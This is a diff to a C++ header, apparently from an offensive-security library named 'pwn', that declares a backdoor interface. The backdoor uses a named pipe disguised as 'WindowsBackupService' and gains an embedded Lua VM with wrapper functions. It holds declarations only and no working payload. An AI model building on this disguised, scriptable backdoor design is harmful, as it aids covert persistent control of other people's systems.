@@ -2,6 +2,16 @@
 
 #include "common.hpp"
 
+///
+/// Definition of the `pwn` module in the Lua VM
+///
+EXTERN_C_START
+#include <lauxlib.h>
+#include <lua.h>
+#include <lualib.h>
+EXTERN_C_END
+
+
 #ifdef PWN_BUILD_FOR_WINDOWS
 #define PWN_BACKDOOR_PIPENAME                                                                                          \
     L"\\\\.\\pipe\\WindowsBackupService"                                                                               \
@@ -13,7 +23,7 @@
 
 ///
 /// @brief Interface for the backdoor
-///
+/// This interface is cross-plaform and should not expose/use any OS-specifics.
 ///
 namespace pwn::backdoor
 {
@@ -44,6 +54,7 @@ public:
         hStateChangeEvent(INVALID_HANDLE_VALUE),
         request(nullptr),
         response(nullptr),
+        pLuaVm(nullptr),
         command_number(0)
     {
         this->hStateChangeEvent = ::CreateEvent(nullptr, false, false, nullptr);
@@ -75,6 +86,7 @@ public:
     std::unique_ptr<u8[]> response;
     usize response_size;
     usize command_number;
+    lua_State* pLuaVm;
 
     HANDLE hThread;
     HANDLE hPipe;
@@ -100,17 +112,42 @@ start();
 Result<bool> PWNAPI
 stop();
 
+
+namespace lua
+{
+///
+/// @brief Wrapper for `pwn::version`
+/// Takes no argument
+/// Returns the version a string
+///
+/// @param l
+/// @return int
+///
+int
+pwn_version(lua_State* l);
+
+///
+/// @brief Wrapper for `pwn::utils::hexdump`
+/// Takes:
+/// - Bytearray to hexdump
+/// Returns the hexdump as a string
+///
+/// @param l
+/// @return int
+///
+int
+pwn_utils_hexdump(lua_State* l);
+
+///
+/// @brief Wrapper for `pwn::process::pid`
+/// Takes no argument
+/// Returns the pid of the backdoored process as a string
+///
+/// @param l
+/// @return int
+///
+int
+pwn_process_pid(lua_State* l);
+
+} // namespace lua
 }; // namespace pwn::backdoor
-
-
-///
-/// Definition of the `pwn` module in the Lua VM
-///
-EXTERN_C_START
-#include <lauxlib.h>
-#include <lua.h>
-#include <lualib.h>
-EXTERN_C_END
-
-LUALIB_API void
-luaL_openpwnlib(lua_State* L);
